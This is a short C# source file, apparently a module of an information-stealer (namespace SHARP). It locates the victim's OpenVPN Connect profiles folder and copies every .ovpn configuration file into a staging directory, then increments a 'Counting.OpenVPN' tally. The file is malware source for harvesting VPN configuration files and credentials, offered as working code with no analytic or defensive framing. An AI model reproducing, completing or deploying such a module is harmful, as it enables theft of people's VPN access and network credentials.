using System;
using System.IO;

namespace SHARP
{
    internal class OpenVPN
    {
      public static void Save(string head)
      {
        string path1 = head;
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
        if (!Directory.Exists(path))
          return;
        try
        {
          Directory.CreateDirectory(path1 + "\\VPN\\OpenVPN");
          foreach (string file in Directory.GetFiles(path))
          {
            if (Path.GetExtension(file).Contains("ovpn"))
              File.Copy(file, Path.Combine(path1, "\\VPN\\OpenVPN" + Path.GetFileName(file)));
          }
          ++Counting.OpenVPN;
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
    }
}
